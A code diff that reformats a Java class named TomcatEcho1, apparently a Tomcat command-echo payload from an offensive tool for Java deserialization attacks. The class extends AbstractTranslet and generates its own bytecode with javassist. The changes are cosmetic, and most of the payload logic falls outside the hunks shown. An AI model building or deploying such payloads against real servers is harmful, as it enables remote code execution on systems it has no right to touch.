@@ -1,5 +1,4 @@
 package cn.safe6.payload;
-
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -9,15 +8,12 @@ import javassist.ClassPool;
 import javassist.CtClass;
 
 public class TomcatEcho1 extends AbstractTranslet {
-
     public static byte[] getPayload() throws Exception {
         ClassPool pool = ClassPool.getDefault();
         CtClass ctClass = pool.get("cn.safe6.payload.TomcatEcho1");
-        ctClass.setName(ctClass.getName() + System.nanoTime());
-
+        ctClass.setName(ctClass.getName()+System.nanoTime());
         return ctClass.toBytecode();
     }
-
     static {
         try {
             boolean flag = false;
@@ -85,23 +81,16 @@ public class TomcatEcho1 extends AbstractTranslet {
                         if (flag) break;
                     }
                     if (flag) break;
-                } catch (Exception e) {
-                    continue;
+                } catch (Exception ignored) {
                 }
             }
-
-        } catch (Exception e) {
+        } catch (Exception ignored) {
         }
     }
-
-
     @Override
     public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
-
     }
-
     @Override
     public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
-
     }
 }
